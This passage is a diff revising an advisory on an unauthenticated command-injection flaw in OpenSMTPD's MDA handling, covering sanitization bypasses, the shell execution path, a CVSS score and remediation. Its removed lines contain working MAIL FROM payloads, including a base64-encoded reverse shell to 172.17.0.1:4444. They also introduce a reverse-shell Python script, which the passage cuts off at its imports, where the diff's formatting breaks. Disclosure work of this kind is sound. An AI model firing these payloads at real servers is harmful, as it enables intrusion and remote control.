@@ -1,97 +1,92 @@
-**Vulnerability: OpenSMTPD Unauthenticated Command Injection**
+# Vulnerability: OpenSMTPD Unauthenticated Command Injection
 
-**1\. Executive Vulnerability Profile**
+## 1. Executive Vulnerability Profile
 
-This assessment identifies a critical security regression in OpenSMTPD that facilitates unauthenticated remote code execution (RCE). The vulnerability represents a fundamental re-emergence of the flaws addressed in CVE-2020-7247, demonstrating that current sanitization logic can be entirely circumvented through the use of documented features. In the context of a core Mail Transfer Agent (MTA), this flaw poses a catastrophic risk to infrastructure integrity, as it allows an external actor to execute arbitrary commands with the privileges of the MDA delivery user—and potentially escalate to higher privileges—without any prior authentication or victim interaction.
+OpenSMTPD 7.8.0p1 (Portable) contains a command-injection vulnerability that can result in unauthenticated remote code execution under specific MDA configurations.
+
+The issue is closely related to the command-injection vulnerability addressed by CVE-2020-7247. The primary problem is that OpenSMTPD's existing sanitization can be bypassed through functionality that is part of the documented MDA configuration language. In particular, the `:raw` token modifier can prevent the normal escaping performed during MDA variable expansion. In addition, several MDA environment variables are populated from envelope data and can subsequently reach a shell-based execution path.
+
+The practical impact depends on the target's MDA configuration and the privileges of the process executing the delivery command. Where the vulnerable execution path is reachable, an unauthenticated SMTP client can influence command execution without requiring user interaction.
 
 | Field | Details |
-| :---- | :---- |
+| :--- | :--- |
 | **Vulnerability Type** | OS Command Injection (CWE-78) |
 | **Affected Software** | OpenSMTPD 7.8.0p1 (Portable) |
-| **Impact** | Unauthenticated Remote Code Execution (RCE) |
-| **Discovery Status** | Confirmed via live exploitation |
+| **Impact** | Unauthenticated Remote Code Execution |
+| **Authentication Required** | None |
+| **Discovery Status** | Confirmed through live testing |
 
-The existence of this vulnerability within a core infrastructure component necessitates an immediate technical review of the underlying sanitization bypasses and the multi-layered shell environment that enables them.
+The vulnerability is primarily caused by a mismatch between the assumptions made by the different sanitization layers and the way MDA commands are ultimately executed.
 
-**2\. Analysis of Primary Attack Vectors**
+---
 
-The OpenSMTPD security model utilizes a two-layer sanitization architecture to protect the Mail Delivery Agent (MDA) execution path. **Layer 1** utilizes an allowlist check in valid\_localpart() (util.c:417) to restrict characters at the SMTP envelope stage. **Layer 2** utilizes MAILADDR\_ESCAPE (mda\_variables.c:201-204) to replace shell metacharacters with colons during token expansion. However, current implementation flaws allow both layers to be bypassed.
+## 2. Attack Surface and Sanitization Analysis
 
-**Vector 1: The :raw Modifier Bypass**
+OpenSMTPD's MDA execution path uses multiple mechanisms to process values originating from SMTP envelope data.
 
-The most direct vector involves the :raw token expansion modifier. As documented in smtpd.conf(5) (lines 1107-1114), this modifier is a standard formatting option intended to preserve the original value of MDA tokens. Technically, when a token such as %{sender:raw} is expanded, the system sets a raw flag (found at mda\_variables.c:188). This flag explicitly instructs the expansion logic to skip the Layer 2 MAILADDR\_ESCAPE loop. Consequently, metacharacters that were permitted by the Layer 1 allowlist reach the shell entirely unsanitized, effectively nullifying the original fix for CVE-2020-7247.
+The first layer is the local-part validation performed by `valid_localpart()` in `util.c`. This restricts which characters can enter the envelope address at the SMTP stage.
 
-**Vector 2: Unsanitized Environment Variables**
+The second layer occurs during MDA variable expansion. `MAILADDR_ESCAPE`, located in `mda_variables.c`, is intended to escape characters that could otherwise have shell significance before those values are inserted into an MDA command.
 
-A secondary and more insidious vector exists via the population of MDA environment variables. In mda\_unpriv.c:62-78, variables including $SENDER, $LOCAL, $RECIPIENT, $DOMAIN, $EXTENSION, and $ORIGINAL\_RECIPIENT are populated directly from raw envelope data without any sanitization. Because these variables are documented features (found in smtpd.conf(5) lines 1134-1174) frequently referenced in MDA command templates, they provide an injection path that persists even if the :raw modifier is not explicitly used.
+The problem is that these two layers do not provide equivalent protection in every execution path.
 
-**Sanitization Gap Analysis**
+### Vector 1: `:raw` Token Modifier
 
-The following table details the characters permitted by the MAILADDR\_ALLOWED allowlist in util.c:417 and their specific functional utility in constructing a shell-based exploit when Layer 2 is bypassed:
+The most direct bypass involves the documented `:raw` token modifier.
 
-| Character | Specific Functional Role in Exploit Construction |
-| :---- | :---- |
-| \` | **Command substitution:** Acts as the primary delimiter for payload execution. |
-| $ | **Parameter expansion:** Enables the use of ${IFS} to bypass whitespace filters. |
-| { } | **Parameter expansion:** Required syntax for complex variable substitution. |
-| | | **Piping:** Facilitates chaining commands, such as decoding Base64 strings. |
-| / | **Path separator:** Necessary for specifying directories or /dev/tcp/ sockets. |
+The modifier is intended to return the original value of an MDA token without applying the normal formatting or escaping behavior. During token expansion, the implementation sets a raw flag, which causes the normal `MAILADDR_ESCAPE` processing to be skipped.
 
-The intersection of these permitted characters and the lack of secondary sanitization creates a reliable path to the underlying shell execution environment.
+As a result, characters that have already passed the SMTP local-part validation stage can reach the generated MDA command without receiving the second layer of shell escaping.
 
-**3\. Execution Mechanics: The Dual-Shell Chain**
+The important point is that this is not an undocumented parser quirk. `:raw` is an existing feature of the MDA configuration language. The vulnerability therefore results from the interaction between a legitimate feature and the security assumptions made by the sanitization layer.
 
-The exploitation of OpenSMTPD is uniquely facilitated by a "double-shell" execution environment. This architecture ensures that even if a payload survives the initial expansion, it is subjected to a second round of shell interpretation.
+### Vector 2: MDA Environment Variables
 
-* **Shell 1 (mda\_unpriv.c:98):** The system calls execle("/bin/sh", "/bin/sh", "-c", mda\_command, ...) to execute the MDA command. This shell handles the initial token expansion. The :raw vector is interpreted here; because the backticks are expanded directly into the command string, they are immediately executed as command substitutions by this first shell instance.
+A second execution path exists through the environment variables supplied to the MDA process.
 
-* **Shell 2 (mail.mda.c:56):** The mail.mda utility calls system(argv\[0\]) on the command string it receives. This triggers a second invocation of /bin/sh \-c. This is the primary execution point for the $SENDER vector. While Shell 1 expands the environment variable, it does not re-parse the expanded content. However, the literal backticks within that variable are passed to Shell 2, where the system() call triggers the final execution of the embedded payload.
+In `mda_unpriv.c`, variables including:
 
-This "double-shell" path creates a robust environment for exploitation, ensuring that malicious inputs expanded in the first stage are ultimately executed in the second.
+- `SENDER`
+- `LOCAL`
+- `RECIPIENT`
+- `DOMAIN`
+- `EXTENSION`
+- `ORIGINAL_RECIPIENT`
 
-**4\. Exploitation Methodology and Payload Construction**
+are populated using values derived from the SMTP envelope.
 
-An attacker can achieve RCE by establishing an unauthenticated SMTP connection and providing a specifically crafted MAIL FROM address. The exploitation methodology must account for the lack of whitespace permitted in the Layer 1 allowlist.
+These variables are documented MDA features and can be referenced by delivery commands. Consequently, sanitization performed when constructing the original SMTP envelope does not necessarily prevent command injection if the resulting value is later interpreted by another shell.
 
-**Payload Construction and Whitespace Bypass**
+This creates a separate trust-boundary problem: data that was originally treated as an email address is subsequently reused as part of a command-execution environment.
 
-To circumvent the whitespace restriction, the exploit utilizes the Internal Field Separator—${IFS}. A functional Proof of Concept (PoC) to verify file system write access appears as follows: MAIL FROM: \<touch${IFS}/tmp/pwned@example.com\>
+### Sanitization Gap
 
-**Advanced Payload: The Interactive Reverse Shell**
+The security impact comes from the intersection between the characters accepted by the local-part validation and the characters that retain special meaning to the shell.
 
-For complex execution, Base64 encoding is the optimal strategy because its alphabet (A-Za-z0-9+/=) is entirely contained within the MAILADDR\_ALLOWED set. This allows for payloads of arbitrary complexity. A confirmed reverse shell payload—decoding to bash \-i \>& /dev/tcp/172.17.0.1/4444 0\>&1—is constructed as:
+Examples include:
 
-MAIL FROM: \<echo{IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC4xLzQ0NDQgMD4mMQ==|base64{IFS}-d|bash@example.com\>
+| Character | Relevance |
+| :--- | :--- |
+| `` ` `` | Shell command substitution |
+| `$` | Parameter and variable expansion |
+| `{` / `}` | Variable-expansion syntax |
+| `\|` | Pipeline construction |
+| `/` | Path construction |
 
-Upon mail delivery, this payload triggers an interactive bash session. Given that this requires no authentication and no victim interaction, the severity of this exploit exceeds standard High-severity thresholds.
+The presence of these characters alone does not create command injection. The critical condition is that they survive the relevant sanitization stage and subsequently reach a shell parser.
 
-**5\. CVSS v3.1 Severity Assessment & Rationalization**
+---
 
-While initial assessments might suggest a "High" severity, a rigorous application of the CVSS v3.1 framework demands a "Critical" designation.
+## 3. Execution Mechanics
 
-**CVSS Scoring Argument**
+The vulnerable execution path is particularly important because the MDA processing can involve multiple layers of command interpretation.
 
-* **Proposed Vector:** AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+### First Shell
 
-* **Final Score: 9.8 (Critical)**
+In `mda_unpriv.c`, the MDA command is executed through:
 
-The core of the debate centers on **Attack Complexity (AC)**. While the vulnerability requires a specific MDA configuration (the use of :raw or unsanitized environment variables), the CVSS v3.1 specification explicitly dictates that Attack Complexity should reflect **"execution-phase complexity only."** Once the target environment is configured, the exploit is fully deterministic; it does not rely on race conditions, unpredictable memory offsets, or man-in-the-middle positioning. Therefore, the complexity is Low (AC:L), necessitating the 9.8 Critical rating.
-
-**6\. Comprehensive Remediation Framework**
-
-Remediation must move beyond reactionary patching to address the structural flaws in OpenSMTPD's MDA execution logic through a defense-in-depth approach.
-
-**Mandatory Technical Fixes**
-
-1. **Unconditional Token Sanitization:** Modify mda\_variables.c:201-204 to apply MAILADDR\_ESCAPE regardless of the :raw flag. If the :raw modifier must preserve the \+ character for subaddressing functionality, the escape logic must be refined to a narrower set that still captures all shell metacharacters.
-
-2. **Environment Variable Hardening:** Mandatory sanitization must be applied to all variables exported to the MDA in mda\_unpriv.c:62-78, specifically SENDER, LOCAL, RECIPIENT, DOMAIN, EXTENSION, and ORIGINAL\_RECIPIENT.
-
-3. **Process Execution Reform:** Replace the system() call in mail.mda.c:56 with execvp(). This transition to direct execution eliminates the second shell invocation and effectively closes the injection vector for $SENDER and other environment variables.
-
-4. **Allowlist Tightening:** Tighten the MAILADDR\_ALLOWED allowlist in util.c:417. Characters such as \`, $, {, }, and | serve no legitimate purpose in the local-part production of RFC 5321 and should be removed to block exploits at Layer 1\.
-
-This exploit PoC script written establishes a stable reverse shell:
+```text
+/bin/sh -c
 ```python
 import argparse
 import base64
